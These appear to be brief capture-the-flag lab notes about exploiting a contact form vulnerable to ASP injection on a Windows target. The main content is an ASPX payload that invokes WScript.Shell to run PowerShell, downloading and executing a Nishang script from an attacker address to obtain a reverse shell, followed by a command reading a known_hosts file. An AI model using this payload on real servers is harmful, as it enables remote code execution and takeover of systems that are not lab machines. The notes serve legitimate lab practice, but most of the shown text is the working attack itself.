# Contact Form

Contact form is vulnerable to ASP injection

![[Pasted image 20210819164632.png]]


![[Pasted image 20210819164651.png]]


# Getting reverse shell

```aspx
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Call oScript.Run ("cmd.exe /c powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11/nishang.ps1')", 0, True)
%>
```

# Req.txt

```bash
-----BEGIN CERTIFICATE REQUEST-----

-----END CERTIFICATE REQUEST-----
```


# known_hosts

```bash
cat C:\Users\ContainerAdministrator\.ssh\known_hosts
192.168.66.3 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUobz+s+TDcuqCZNX5rFUE2Wse501X8g6qNUIRx6pVkVXvgAp8dMPdqsUytg3x4t7N85nbSHVHY/uVYrzpRuEM=
```


